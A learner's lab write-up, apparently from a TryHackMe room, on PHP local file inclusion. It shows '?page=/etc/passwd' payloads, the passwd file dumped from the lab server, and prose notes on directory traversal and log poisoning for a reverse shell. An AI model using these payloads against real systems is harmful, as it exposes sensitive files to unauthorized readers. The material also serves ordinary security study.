# LFI - Local File Inclusion


### what is LFI??

- Local file inclusion is a vlulnerability an attacker can exploit to include and read files they are not supposed to leading to them discovering more ways to harm the system.

- This is another issue blinding trusting user input. This attack is mostly performed on php backends as they have the include statement. This include statement can be fed very malicious code which it will also execute.

-This could resut in..
	1. Denial of service attack.	
	2. Remote code execution on the server.
	3. Sensitive Information Disclosure.

### Task 1 - Local File Inclusion

```
export IP=10.10.195.25
```

- Accessed the web server on the ip and did my first local file inclusion exploit.

- Added this query at the end of the url of the vulnerable webapp 
```
?page=home.html 

?page=/etc/passwd
```

- /etc/passwd file as read from the server
```
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:109:117::/nonexistent:/bin/false
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
saned:x:119:127::/var/lib/saned:/bin/false
usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
lfi:x:1000:1000:THM,,,:/home/lfi:/bin/bash

```

- Here is a sample of a vulnerable php code that allows file inclusion
```php
<?php 
	$local_file = $_REQUEST["page"]
?>
```

### [Task 2] Local File Inclusion Using Directory Traversal

- directory traversal also called path traversal or backtracking is accessing files on the servers system that is not intended to be seen by end user. This is done by manipulating variables used to reference the files. [futher-reading](https://owasp.org/www-community/attacks/Path_Traversal)

- This path traversal just means using the dot-dot-slash linux path traversal to try to locate further out of the webroot directory.


### [Task 3] Reaching RCE using LFI and log poisoning

- Okay even the heading sounds not easy! LOL.

- Log poisoning from what i'm reading online is trying to get a reverse shell on the server by injecting malicious code into the server logs through lfi. [further-reading](https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1)

- The room guide asks to fire up burpsuite and since i havent used it before, i'll fire up python for this task.
